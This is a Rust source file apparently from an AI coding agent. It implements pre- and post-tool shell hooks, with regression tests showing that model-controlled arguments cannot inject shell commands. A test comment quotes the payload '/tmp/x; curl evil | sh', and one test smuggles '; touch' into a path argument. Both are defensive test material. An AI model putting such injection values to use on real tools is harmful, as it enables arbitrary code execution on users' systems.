//! Shell hooks around tool execution.
//!
//! A hook is a shell command run before or after a tool call. The
//! command is a template: `{path}`, `{command}`, `{pattern}`, `{content}`
//! are substituted from the call's arguments. A non-zero exit from a
//! `pre_tool_use` hook fails the tool call with the hook's stderr as the
//! reason — that is how a team enforces "never write without rustfmt"
//! without patching the agent itself.
//!
//! Deliberately small: spawn a shell, substitute a few strings, check
//! the exit code. Not a plugin system.

use kod_config::HooksConfig;
use kod_error::{KodError, Result};
use kod_types::ToolCall;

/// Outcome of a hook.
#[derive(Debug, Clone)]
pub struct HookOutcome {
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
}

impl HookOutcome {
    pub fn ok(&self) -> bool {
        self.exit_code == 0
    }
}

/// The engine's dispatcher. Constructed once from `KodConfig::hooks`.
#[derive(Clone)]
pub struct HookRunner {
    config: HooksConfig,
}

impl HookRunner {
    pub fn new(config: HooksConfig) -> Self {
        Self { config }
    }

    /// A disabled runner. Used as the default when no config is
    /// installed — the shape a test or a one-shot CLI invocation wants.
    pub fn disabled() -> Self {
        Self {
            config: HooksConfig::default(),
        }
    }

    pub fn is_enabled(&self) -> bool {
        self.config.enabled
            && (!self.config.pre_tool_use.is_empty() || !self.config.post_tool_use.is_empty())
    }

    /// Run every pre-tool hook that matches `call`. Returns `Ok(())` when
    /// all pass (or none match) and an error naming the first failing
    /// hook otherwise.
    pub async fn run_pre(&self, call: &ToolCall) -> Result<()> {
        if !self.is_enabled() {
            return Ok(());
        }
        let envs = env_pairs(call);
        for (key, template) in &self.config.pre_tool_use {
            if !matches_key(key, &call.tool_name) {
                continue;
            }
            let outcome = run_shell(template, &envs).await?;
            if !outcome.ok() {
                return Err(KodError::PermissionDenied {
                    action: format!("pre_tool_use hook for {}", call.tool_name),
                    reason: format!(
                        "hook {:?} exited {}\nstdout: {}\nstderr: {}",
                        key, outcome.exit_code, outcome.stdout, outcome.stderr
                    ),
                });
            }
        }
        Ok(())
    }

    /// Run every post-tool hook that matches `call`. Failures are logged
    /// but never propagate — a post-hook exists to enforce a convention,
    /// and a formatting failure should not turn a successful write into
    /// a failed tool call.
    pub async fn run_post(&self, call: &ToolCall) {
        if !self.is_enabled() {
            return;
        }
        let envs = env_pairs(call);
        for (key, template) in &self.config.post_tool_use {
            if !matches_key(key, &call.tool_name) {
                continue;
            }
            match run_shell(template, &envs).await {
                Ok(outcome) if outcome.ok() => {}
                Ok(outcome) => {
                    tracing::warn!(
                        hook = %key,
                        exit_code = outcome.exit_code,
                        stdout = %outcome.stdout,
                        stderr = %outcome.stderr,
                        "post_tool_use hook failed"
                    );
                }
                Err(e) => {
                    tracing::warn!(
                        hook = %key,
                        error = %e,
                        "post_tool_use hook could not run"
                    );
                }
            }
        }
    }
}

/// Match a config key against a tool name. `write_file` matches every
/// call of that tool; `write_file.path` (the field before the dot is the
/// tool name) matches the same tool — the suffix lets a config carry
/// several hooks for one tool without a map-key collision.
fn matches_key(key: &str, tool_name: &str) -> bool {
    if key == tool_name {
        return true;
    }
    match key.split_once('.') {
        Some((tool, _field)) => tool == tool_name,
        None => false,
    }
}

/// The environment variables a hook template can reference.
///
/// The template uses shell variable syntax (`$KOD_PATH`,
/// `$KOD_COMMAND`, ...); the runner sets these from the tool call's
/// arguments before spawning the shell. **Arguments are never
/// spliced into the command string**, so a model that controls an
/// argument cannot inject shell syntax through it. Only the
/// template (config-trusted) is parsed as shell.
///
/// A template that references a variable the call did not supply
/// sees the shell's "unset" expansion -- `$KOD_PATH` becomes the
/// empty string, not the literal text `{path}`. That is the
/// deliberate behaviour change from the previous text-substitution
/// design.
fn env_pairs(call: &ToolCall) -> Vec<(&'static str, String)> {
    let mut out = Vec::new();
    for (arg, var) in [
        ("path", "KOD_PATH"),
        ("command", "KOD_COMMAND"),
        ("pattern", "KOD_PATTERN"),
        ("content", "KOD_CONTENT"),
        ("file", "KOD_FILE"),
    ] {
        if let Some(v) = call.arguments.get(arg).and_then(|v| v.as_str()) {
            out.push((var, v.to_string()));
        }
    }
    out
}

/// A hook that runs longer than this is killed and reported as a
/// failure. The bound is generous (a `cargo fmt` on a large tree is a
/// few seconds) and finite: without a timeout one hung hook stalls
/// every subsequent tool call on the same transcript key.
const HOOK_TIMEOUT_SECS: u64 = 30;

/// Per-stream byte cap for hook output. The previous shape embedded
/// stdout/stderr verbatim into a `PermissionDenied` error; a hook
/// that printed a megabyte produced a megabyte-long error message.
/// The tail is kept -- that is where the failure reason lives.
const MAX_HOOK_OUTPUT_BYTES: usize = 8 * 1024;

fn cap_hook_output(raw: &[u8]) -> String {
    let s = String::from_utf8_lossy(raw);
    if s.len() <= MAX_HOOK_OUTPUT_BYTES {
        return s.to_string();
    }
    let tail = kod_types::strutil::truncate_chars(
        &s[s.len() - MAX_HOOK_OUTPUT_BYTES..],
        MAX_HOOK_OUTPUT_BYTES,
    );
    format!(
        "[...output truncated; last {MAX_HOOK_OUTPUT_BYTES} bytes follow...]
{tail}"
    )
}

async fn run_shell(template: &str, envs: &[(&'static str, String)]) -> Result<HookOutcome> {
    let (shell, flag) = if cfg!(windows) {
        ("cmd", "/C")
    } else {
        ("sh", "-c")
    };
    let mut cmd = tokio::process::Command::new(shell);
    cmd.arg(flag)
        .arg(template)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped());
    for (k, v) in envs {
        cmd.env(k, v);
    }
    let output = tokio::time::timeout(
        std::time::Duration::from_secs(HOOK_TIMEOUT_SECS),
        cmd.output(),
    )
    .await
    .map_err(|_| KodError::ProviderTimeout {
        timeout_ms: HOOK_TIMEOUT_SECS * 1000,
    })?
    .map_err(KodError::Io)?;
    Ok(HookOutcome {
        exit_code: output.status.code().unwrap_or(-1),
        stdout: cap_hook_output(&output.stdout),
        stderr: cap_hook_output(&output.stderr),
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn call(name: &str, args: serde_json::Value) -> ToolCall {
        ToolCall {
            id: None,
            tool_name: name.to_string(),
            arguments: args,
        }
    }

    #[test]
    fn matches_key_honors_tool_and_tool_field() {
        assert!(matches_key("write_file", "write_file"));
        assert!(matches_key("write_file.path", "write_file"));
        assert!(!matches_key("read_file", "write_file"));
    }

    #[tokio::test]
    async fn disabled_runner_is_a_no_op() {
        let runner = HookRunner::disabled();
        assert!(!runner.is_enabled());
        let c = call("write_file", json!({"path": "/tmp/x"}));
        runner.run_pre(&c).await.unwrap();
        runner.run_post(&c).await;
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn pre_hook_failure_aborts_the_call() {
        let mut pre = std::collections::HashMap::new();
        pre.insert(
            "write_file".to_string(),
            "echo 'not allowed' >&2; exit 1".to_string(),
        );
        let runner = HookRunner::new(HooksConfig {
            enabled: true,
            pre_tool_use: pre,
            ..Default::default()
        });
        let c = call("write_file", json!({"path": "/tmp/x", "content": "y"}));
        let err = runner.run_pre(&c).await.unwrap_err();
        assert!(err.to_string().contains("not allowed"));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn pre_hook_success_lets_the_call_through() {
        let mut pre = std::collections::HashMap::new();
        pre.insert("write_file".to_string(), "exit 0".to_string());
        let runner = HookRunner::new(HooksConfig {
            enabled: true,
            pre_tool_use: pre,
            ..Default::default()
        });
        let c = call("write_file", json!({"path": "/tmp/x", "content": "y"}));
        runner.run_pre(&c).await.unwrap();
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn post_hook_failure_does_not_propagate() {
        let mut post = std::collections::HashMap::new();
        post.insert("write_file".to_string(), "exit 1".to_string());
        let runner = HookRunner::new(HooksConfig {
            enabled: true,
            post_tool_use: post,
            ..Default::default()
        });
        let c = call("write_file", json!({"path": "/tmp/x", "content": "y"}));
        runner.run_post(&c).await;
    }
}

#[cfg(test)]
mod coverage_hook_env_and_timeout {
    //! P0-4 regression suite. The pre-fix design substituted
    //! model-controlled arguments into the shell string; a `path` of
    //! `/tmp/x; curl evil | sh` executed arbitrary commands. The new
    //! design passes arguments as environment variables. These tests
    //! prove (a) the env map carries every argument under the right
    //! name, (b) a shell metacharacter in an argument cannot reach
    //! the parser, and (c) a hook that hangs is killed.
    use super::*;
    use serde_json::json;

    fn call(name: &str, args: serde_json::Value) -> ToolCall {
        ToolCall {
            id: None,
            tool_name: name.to_string(),
            arguments: args,
        }
    }

    #[test]
    fn env_pairs_maps_every_known_argument() {
        let c = call(
            "write_file",
            json!({
                "path": "/a.rs",
                "content": "x",
                "command": "c",
                "pattern": "p",
                "file": "f",
            }),
        );
        let envs: std::collections::HashMap<_, _> = env_pairs(&c).into_iter().collect();
        assert_eq!(envs.get("KOD_PATH").map(String::as_str), Some("/a.rs"));
        assert_eq!(envs.get("KOD_CONTENT").map(String::as_str), Some("x"));
        assert_eq!(envs.get("KOD_COMMAND").map(String::as_str), Some("c"));
        assert_eq!(envs.get("KOD_PATTERN").map(String::as_str), Some("p"));
        assert_eq!(envs.get("KOD_FILE").map(String::as_str), Some("f"));
    }

    #[test]
    fn env_pairs_skips_absent_arguments() {
        let c = call("write_file", json!({"path": "/a.rs"}));
        let envs: std::collections::HashMap<_, _> = env_pairs(&c).into_iter().collect();
        assert!(envs.contains_key("KOD_PATH"));
        assert!(!envs.contains_key("KOD_COMMAND"));
    }

    #[test]
    fn env_pairs_ignores_non_string_arguments() {
        let c = call("write_file", json!({"path": "/a.rs", "content": 42}));
        let envs: std::collections::HashMap<_, _> = env_pairs(&c).into_iter().collect();
        assert!(envs.contains_key("KOD_PATH"));
        assert!(!envs.contains_key("KOD_CONTENT"));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn shell_metacharacters_in_arguments_do_not_execute() {
        // The exact injection the review named: a `path` value with
        // `; touch <sentinel>` must NOT create the sentinel. The value
        // is an env var, never part of the command string.
        let tmp = tempfile::TempDir::new().unwrap();
        let sentinel = tmp.path().join("pwned");
        let evil_path = format!("/tmp/x; touch {}", sentinel.display());
        let mut pre = std::collections::HashMap::new();
        // The template is config-trusted and reads $KOD_PATH as argv.
        pre.insert("write_file".to_string(), "true \"$KOD_PATH\"".to_string());
        let runner = HookRunner::new(kod_config::HooksConfig {
            enabled: true,
            pre_tool_use: pre,
            ..Default::default()
        });
        let c = call("write_file", json!({"path": evil_path}));
        let _ = runner.run_pre(&c).await;
        assert!(
            !sentinel.exists(),
            "shell metacharacter leaked from argument into the command",
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn hook_output_is_capped_in_the_error_message() {
        let mut pre = std::collections::HashMap::new();
        pre.insert(
            "write_file".to_string(),
            "yes 'AAAAAAAA' | head -c 200000; exit 1".to_string(),
        );
        let runner = HookRunner::new(kod_config::HooksConfig {
            enabled: true,
            pre_tool_use: pre,
            ..Default::default()
        });
        let c = call("write_file", json!({"path": "/x"}));
        let err = runner.run_pre(&c).await.unwrap_err();
        let msg = err.to_string();
        assert!(msg.len() < 64 * 1024, "not capped: {} bytes", msg.len());
        assert!(msg.contains("truncated"), "cap marker missing");
    }
}
